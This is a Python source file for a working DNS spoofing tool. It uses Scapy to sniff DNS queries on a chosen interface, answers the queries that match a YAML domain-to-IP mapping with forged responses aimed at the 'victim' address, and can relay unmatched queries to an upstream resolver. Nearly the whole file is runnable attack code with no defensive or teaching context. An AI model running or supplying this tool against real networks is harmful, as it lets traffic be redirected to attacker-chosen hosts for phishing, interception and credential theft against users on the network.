

import argparse
import ipaddress
import signal
import socket
import sys
import threading
import time
from pathlib import Path
from typing import Dict, Optional

import yaml
from scapy.all import (
    DNS,
    DNSQR,
    DNSRR,
    IP,
    UDP,
    conf,
    send,
    sniff,
)

class DNSSpoofer(threading.Thread):

    def __init__(
        self,
        iface: str,
        mapping: Dict[str, str],
        upstream: Optional[str] = None,
        relay: bool = False,
    ) -> None:
        super().__init__(daemon=True)
        self.iface = iface
        self.mapping = mapping  
        self.relay = relay
        self.upstream = upstream or "8.8.8.8"
        self.running = threading.Event()
        self.running.set()

    def _matches(self, qname: str) -> Optional[str]:
        """Return spoof IP if qname matches mapping, else None."""
        qname = qname.rstrip('.').lower()
        if qname in self.mapping:
            return self.mapping[qname]
        # wildcard ceck for *.suffix patterns
        for pattern, ip in self.mapping.items():
            if pattern.startswith('*.') and qname.endswith(pattern[2:]):
                return ip
        return None

    def _build_answer(self, pkt: DNS, spoof_ip: str) -> DNS:
        return DNS(
            id=pkt.id,
            qr=1,
            aa=1,
            qd=pkt.qd,
            ancount=1,
            an=DNSRR(rrname=pkt.qd.qname, ttl=300, rdata=spoof_ip),
        )

    def _process(self, pkt):
        # Only handle DNS queries (QR=0)
        if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0):
            return

        qname = pkt[DNSQR].qname.decode('utf-8')
        victim_ip = pkt[IP].src
        dest_port = pkt[UDP].sport

        spoof_ip = self._matches(qname)
        if spoof_ip:
            forged = (
                IP(dst=victim_ip, src=pkt[IP].dst) /
                UDP(dport=dest_port, sport=53) /
                self._build_answer(pkt[DNS], spoof_ip)
            )
            send(forged, iface=self.iface, verbose=False)
            print("[+] Spoofed {} → {} for {}".format(qname, spoof_ip, victim_ip))

        elif self.relay:
            self._relay(pkt)

    def _relay(self, pkt):

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2)
        try:
            # Send raw DNS query to upstream
            sock.sendto(bytes(pkt[DNS]), (self.upstream, 53))
            data, _ = sock.recvfrom(512)
            # Build relay response
            answer = (
                IP(dst=pkt[IP].src, src=pkt[IP].dst) /
                UDP(dport=pkt[UDP].sport, sport=53) /
                DNS(data)
            )
            send(answer, iface=self.iface, verbose=False)
            print("[=] Relayed {} to {}".format(pkt[DNSQR].qname.decode(), pkt[IP].src))
        except socket.timeout:
            print("[!] Upstream DNS timeout; dropping query")
        finally:
            sock.close()

    def run(self):
        print("[*] DNS spoofing active on {}. Relay={}".format(self.iface, self.relay ))
        sniff(
            iface=self.iface,
            filter="udp port 53",
            store=False,
            prn=self._process,
            stop_filter=lambda x: not self.running.is_set(),
        )

    def stop(self):
        self.running.clear()


def load_mapping(path: Path) -> Dict[str, str]:
    raw = yaml.safe_load(path.read_text())
    mapping = {}
    for k, v in raw.items():
        try:
            ipaddress.ip_address(v)
        except ValueError:
            #print(f"[!] Invalid IP in mapping: {v}")
            continue
        mapping[k.lower()] = v
    return mapping


def main():
    parser = argparse.ArgumentParser(
        description="DNS spoofing / relay tool using pure Scapy"
    )
    parser.add_argument("--iface", "-i", required=True, help="Network interface to bind")
    parser.add_argument("--map", "-m", type=Path, required=True, help="YAML mapping file")
    parser.add_argument("--relay", action="store_true", help="Relay unmatched queries upstream")
    parser.add_argument(
        "--upstream",
        default="8.8.8.8",
        help="Upstream DNS server for relay mode (default: 8.8.8.8)",
    )
    args = parser.parse_args()

    mapping = load_mapping(args.map)
    if not mapping:
        print("[!] No valid mappings – aborting")
        sys.exit(1)

    spoofer = DNSSpoofer(args.iface, mapping, upstream=args.upstream, relay=args.relay)
    spoofer.start()

    # Handle Ctrl-C for clean shutdown
    def _sigint(_sig, _frame):
        print("\n[!] Ctrl-C received, shutting down…")
        spoofer.stop()

    signal.signal(signal.SIGINT, _sigint)

    while spoofer.is_alive():
        time.sleep(0.5)

    print("[+] Bye!")

if __name__ == "__main__":
    main()

